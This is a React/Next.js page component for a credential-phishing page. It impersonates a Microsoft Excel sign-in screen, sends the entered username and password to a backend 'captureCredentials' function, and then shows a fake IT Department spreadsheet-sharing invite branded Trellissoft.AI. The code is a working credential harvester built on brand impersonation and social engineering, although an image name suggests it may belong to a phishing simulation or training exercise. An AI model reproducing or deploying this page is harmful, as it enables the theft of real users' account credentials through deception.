'use client';
import { FormEvent, useState } from 'react';
import { captureCredentials } from '@/ai/flows/capture-credentials';

const SpreadsheetInvite = () => {
  return (
    <div className="container">
      <div className="logo">
        <img src="https://dummyimage.com/150x40/00b3b3/ffffff&text=Trellissoft.AI" alt="Trellissoft.AI" />
      </div>

      <h2>IT Department invited you to edit a Spreadsheet</h2>

      <p>Here's the Spreadsheet that IT Department shared with you.</p>

      <div className="file-box">
        <span>📄</span> Update of Asset Details as per New System Policy
      </div>

      <p className="note">🔒 This invite will only work for you and people with existing access.</p>

      <button className="btn">Open</button>
      <button className="btn">Share</button>

      <footer>
        <div className="footer-logo">
          <img src="https://dummyimage.com/80x20/00b3b3/ffffff&text=Trellissoft" alt="Trellissoft logo" />
          <span>Trellissoft.AI</span>
        </div>
        <p>
          This email is generated through Trellissoft’s use of Microsoft 365 and may contain content that is controlled by Trellissoft.
        </p>
      </footer>
    </div>
  );
}


export default function Home() {
  const imageUrl = "https://storage.googleapis.com/fsm-build-artefacts/PhishingSampleAnalysis10June-1.jpg";

  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isSignedIn, setIsSignedIn] = useState(false);

  const handleSubmit = async (event: FormEvent) => {
    event.preventDefault();
    
    // Capture credentials on the backend
    await captureCredentials({ username, password });
    
    // Show the invite page
    setIsSignedIn(true);
  };
  
  if (isSignedIn) {
    return <SpreadsheetInvite />;
  }

  return (
    <>
      {/* Blurred Image */}
      <img id="blurredImage" src={imageUrl} alt="Blurred screenshot" />

      {/* Login Overlay */}
      <div className="login-overlay" role="main" aria-label="Excel Login Screen">
        
        <h2>Sign in to Excel</h2>
        <form onSubmit={handleSubmit}>
          <input 
            type="text" 
            name="username" 
            placeholder="Email or phone" 
            autoComplete="username" 
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            required 
          />
          <input 
            type="password" 
            name="password" 
            placeholder="Password" 
            autoComplete="current-password" 
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required 
          />
          <button type="submit">Sign in</button>
          <small>© Microsoft Corporation</small>
        </form>
      </div>
    </>
  );
}
